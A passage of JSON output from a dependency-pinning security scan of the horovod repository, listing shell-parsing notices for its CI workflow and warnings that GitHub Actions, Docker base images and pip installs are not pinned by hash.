                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1394",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1403",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1412",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1421",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1430",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1439",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1448",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1457",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1466",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1475",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1484",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1493",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1502",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1538",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1547",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1556",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1565",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1574",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1583",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1619",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1628",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1637",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1646",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1655",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1664",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1673",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1682",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1691",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1700",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1709",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1718",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1727",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1736",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1745",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1781",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1790",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1799",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1808",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1817",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1826",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1835",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1844",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1853",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1862",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1871",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1880",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1889",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1898",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:1907",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:2024",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:2033",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:2042",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:2051",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:2060",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:2069",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:2105",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:2114",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:2123",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:2132",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:2141",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:2150",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3072",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3081",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3090",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3099",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3108",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3117",
                        "Info: Possibly incomplete results: error parsing shell code: a command can only contain words and redirects; encountered (: .github/workflows/ci.yaml:3153",
                        "Info: Possibly incomplete results: error parsing shell code: a command can only contain words and redirects; encountered (: .github/workflows/ci.yaml:3162",
                        "Info: Possibly incomplete results: error parsing shell code: a command can only contain words and redirects; encountered (: .github/workflows/ci.yaml:3171",
                        "Info: Possibly incomplete results: error parsing shell code: a command can only contain words and redirects; encountered (: .github/workflows/ci.yaml:3180",
                        "Info: Possibly incomplete results: error parsing shell code: a command can only contain words and redirects; encountered (: .github/workflows/ci.yaml:3189",
                        "Info: Possibly incomplete results: error parsing shell code: a command can only contain words and redirects; encountered (: .github/workflows/ci.yaml:3198",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3207",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3216",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3225",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3234",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3243",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3252",
                        "Info: Possibly incomplete results: error parsing shell code: a command can only contain words and redirects; encountered (: .github/workflows/ci.yaml:3261",
                        "Info: Possibly incomplete results: error parsing shell code: a command can only contain words and redirects; encountered (: .github/workflows/ci.yaml:3270",
                        "Info: Possibly incomplete results: error parsing shell code: a command can only contain words and redirects; encountered (: .github/workflows/ci.yaml:3279",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3288",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3297",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3306",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3315",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3324",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3333",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3369",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3378",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3387",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3396",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3405",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3414",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3423",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3432",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3441",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3450",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3459",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3468",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3477",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3486",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3495",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3531",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3540",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3549",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3558",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3567",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3576",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3612",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3621",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3630",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3639",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3648",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3657",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3666",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3675",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3684",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3693",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3702",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3711",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3720",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3729",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3738",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3774",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3783",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3792",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3801",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3810",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3819",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3828",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3837",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3846",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3855",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3864",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3873",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3882",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3891",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:3900",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:4017",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:4026",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:4035",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:4044",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:4053",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:4062",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:4098",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:4107",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:4116",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:4125",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:4134",
                        "Info: Possibly incomplete results: error parsing shell code: \"foo(\" must be followed by ): .github/workflows/ci.yaml:4143",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci-results.yaml:188: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci-results.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci-results.yaml:208: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci-results.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-results.yaml:218: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci-results.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-results.yaml:285: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci-results.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci-results.yaml:310: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci-results.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci-results.yaml:321: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci-results.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci-results.yaml:98: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci-results.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci-results.yaml:118: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci-results.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-results.yaml:128: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci-results.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:4459: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:4554: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yaml:4652: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:4661: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:4888: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:58: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:60: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:435: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:440: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:2343: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:2428: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:2433: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:4336: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:48: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yaml:4634: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:4738: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yaml:4744: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yaml:4760: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yaml:4766: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yaml:4799: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yaml:4840: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yaml:4577: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci.yaml:4595: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:4604: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:88: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:90: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:165: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:4389: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:4394: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:4408: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:42: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/codeql-analysis.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:51: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/codeql-analysis.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:57: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/codeql-analysis.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:100: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/codeql-analysis.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:105: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/codeql-analysis.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:152: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/codeql-analysis.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql-analysis.yml:166: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/codeql-analysis.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/upload-pypi.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/upload-pypi.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/upload-pypi.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/horovod/horovod/upload-pypi.yml/master?enable=pin",
                        "Warn: containerImage not pinned by hash: Dockerfile.test.cpu:2",
                        "Warn: containerImage not pinned by hash: Dockerfile.test.gpu:2",
                        "Warn: containerImage not pinned by hash: docker/horovod-cpu/Dockerfile:1: pin your Docker image by updating ubuntu:20.04 to ubuntu:20.04@sha256:8e5c4f0285ecbb4ead070431d29b576a530d3166df73ec44affc1cd27555141b",
                        "Warn: containerImage not pinned by hash: docker/horovod-nvtabular/Dockerfile:2",
                        "Warn: containerImage not pinned by hash: docker/horovod-ray/Dockerfile:2",
                        "Warn: containerImage not pinned by hash: docker/horovod/Dockerfile:2",
                        "Warn: downloadThenRun not pinned by hash: Dockerfile.test.cpu:65-69",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:71",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:89-95",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:89-95",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:89-95",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:100-102",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:105",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:145-151",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:156-169",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:156-169",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:172",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:180-194",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:180-194",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:180-194",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:180-194",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:180-194",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:198-200",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:218-226",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:218-226",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:233-243",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:233-243",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:233-243",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:233-243",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.cpu:246-248",
                        "Warn: downloadThenRun not pinned by hash: Dockerfile.test.gpu:77-81",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:83",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:101-107",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:101-107",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:101-107",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:110",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:130-132",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:137-156",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:137-156",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:137-156",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:159",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:167-181",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:167-181",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:167-181",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:167-181",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:167-181",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:184-186",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:204-214",
                        "Warn: pipCommand not pinned by hash: Dockerfile.test.gpu:204-214",
